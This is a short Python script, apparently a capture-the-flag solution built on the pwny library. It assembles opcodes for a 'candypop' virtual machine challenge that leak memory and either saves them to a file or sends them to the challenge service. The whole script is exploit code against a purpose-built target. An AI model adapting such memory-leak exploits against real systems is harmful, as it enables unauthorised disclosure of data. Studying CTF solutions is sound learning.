#! /usr/bin/env python

from pwny import *


def connection_factory():
    # Connect to the candy machine (no longer available)
    # return Flow.connect_tcp('52.16.33.218', 22226)

    # If you want to use the local executable, use:
    return Flow.execute('./candypop')

    # Or, via ssh (I've got a virtual machine set up for this):
    # return Flow.execute_ssh('./candypop', '127.0.0.1', 2224)


# Function to pack a series of candypop VM commands
def build(c):
    return pack('>' + 'BBH' * (len(c) // 3), *c)


# Create the program that leaks the memory.
program = []
for i in range(10, 256):
    program.extend([
        0xa5, i, 0,
    ])

# Change True to False to connect to the candy machine directly instead of dropping a pre-compiled program.
if True:
    # Our pre-compiled program also issues the read instruction.
    program.extend([0xfe, 0, 0])
    with open('candyflood', 'wb') as f:
        f.write(build(program))
else:
    f = connection_factory()
    f.until(b'INPUT PROGRAM:\n')
    f.write(build(program))

    # Read the output.
    f.read_eof(echo=True)
